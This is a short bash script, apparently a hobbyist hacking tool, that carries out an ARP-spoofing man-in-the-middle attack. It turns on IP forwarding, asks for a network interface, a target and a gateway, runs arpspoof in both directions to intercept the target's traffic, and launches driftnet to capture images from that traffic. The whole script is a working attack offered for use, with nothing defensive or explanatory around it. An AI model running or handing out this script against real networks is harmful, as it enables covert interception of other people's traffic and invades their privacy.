#!/bin/bash
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "\033[1;34;70m


					 -------------------------------------------------------
					|			 WELCOME			|
					|			ONII CHAN	                |
					|@uth0r Ethical Astra               			|
					|                     		  m0d!f!3r B!n@ry N!5h@n|
					 -------------------------------------------------------   

\033[0m"
 
read -p "[+]Please enter interface name: " interface 
read -p "[+]Please enter the target:  " target
read -p "[+]Please enter the host to spoof as, usually gateway: " gateway

echo -e "\n\n[+]Executing both commands\n\n"
arpspoof -i $interface  -t  $target $gateway & arpspoof -i $interface -t $gateway $target & driftnet

